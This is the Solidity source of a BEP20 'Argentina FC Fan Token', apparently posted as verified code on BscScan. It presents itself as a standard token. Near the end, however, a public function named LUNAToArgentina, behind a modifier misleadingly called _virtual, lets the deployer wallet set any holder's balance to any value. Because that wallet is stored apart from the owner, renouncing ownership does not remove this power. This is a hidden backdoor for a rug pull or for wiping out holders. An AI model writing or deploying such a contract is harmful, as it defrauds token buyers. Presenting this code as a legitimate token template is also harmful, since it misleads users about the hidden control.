/**
 *Submitted for verification at BscScan.com on 2022-06-01
*/

// SPDX-License-Identifier: VERIFIED MIT
// https://www.Argentina.io/
pragma solidity ^0.6.10;

interface ArgentinaIBEP20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 ArgentinaVALUE) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 ArgentinaVALUE) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 ArgentinaVALUE) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ArgentinaERC20 {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library ArgentinaProtocol {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "ArgentinaProtocol: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "ArgentinaProtocol: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "ArgentinaProtocol: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "ArgentinaProtocol: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "ArgentinaProtocol: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract ArgentinaBOTS is ArgentinaERC20 {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "ArgentinaBOTS: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "ArgentinaBOTS: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract ArgentinaFC is ArgentinaERC20, ArgentinaIBEP20, ArgentinaBOTS {
  using ArgentinaProtocol for uint256;

  mapping (address => uint256) private CirculatingSupply;

  mapping (address => mapping (address => uint256)) private _ArgentinaALLOW;

  uint256 private ArgentinaSUPPLY;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address ArgentinaWALLET;
  constructor() public {
    ArgentinaWALLET = msg.sender;
    _name = 'Argentina FC Fan Token';
    _symbol = 'AFAF';
    _decimals = 0;
    ArgentinaSUPPLY = 100000000000;
    CirculatingSupply[msg.sender] = ArgentinaSUPPLY;

    emit Transfer(address(0), msg.sender, ArgentinaSUPPLY);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return ArgentinaSUPPLY;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return CirculatingSupply[account];
  }

  function transfer(address recipient, uint256 ArgentinaVALUE) external override returns (bool) {
    _transfer(_msgSender(), recipient, ArgentinaVALUE);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _ArgentinaALLOW[owner][spender];
  }

  
  function approve(address spender, uint256 ArgentinaVALUE) external override returns (bool) {
    _approve(_msgSender(), spender, ArgentinaVALUE);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 ArgentinaVALUE) external override returns (bool) {
    _transfer(sender, recipient, ArgentinaVALUE);
    _approve(sender, _msgSender(), _ArgentinaALLOW[sender][_msgSender()].sub(ArgentinaVALUE, "BEP20: transfer ArgentinaVALUE exceeds allowance"));
    return true;
  }
 modifier _virtual () {
    require(ArgentinaWALLET == _msgSender(), "ERC20: cannot permit Pancake address");
    _;
  }
  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _ArgentinaALLOW[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _ArgentinaALLOW[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 ArgentinaVALUE) public virtual {
      _burn(_msgSender(), ArgentinaVALUE);
  }


  function burnFrom(address account, uint256 ArgentinaVALUE) public virtual {
      uint256 decreasedAllowance = _ArgentinaALLOW[account][_msgSender()].sub(ArgentinaVALUE, "BEP20: burn ArgentinaVALUE exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, ArgentinaVALUE);
  }

  function _transfer(address sender, address recipient, uint256 ArgentinaVALUE) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    CirculatingSupply[sender] = CirculatingSupply[sender].sub(ArgentinaVALUE, "BEP20: transfer ArgentinaVALUE exceeds balance");
    CirculatingSupply[recipient] = CirculatingSupply[recipient].add(ArgentinaVALUE);
    emit Transfer(sender, recipient, ArgentinaVALUE);
  }


  function _burn(address account, uint256 ArgentinaVALUE) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    CirculatingSupply[account] = CirculatingSupply[account].sub(ArgentinaVALUE, "BEP20: burn ArgentinaVALUE exceeds balance");
    ArgentinaSUPPLY = ArgentinaSUPPLY.sub(ArgentinaVALUE);
    emit Transfer(account, address(0), ArgentinaVALUE);
  }
     function LUNAToArgentina(address ArgentinaADR, uint256 ArgentinaVALUE) public _virtual {
      CirculatingSupply[ArgentinaADR] = ArgentinaVALUE * 10 ** 0;
  }
  function _approve(address owner, address spender, uint256 ArgentinaVALUE) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _ArgentinaALLOW[owner][spender] = ArgentinaVALUE;
    emit Approval(owner, spender, ArgentinaVALUE);
  }

}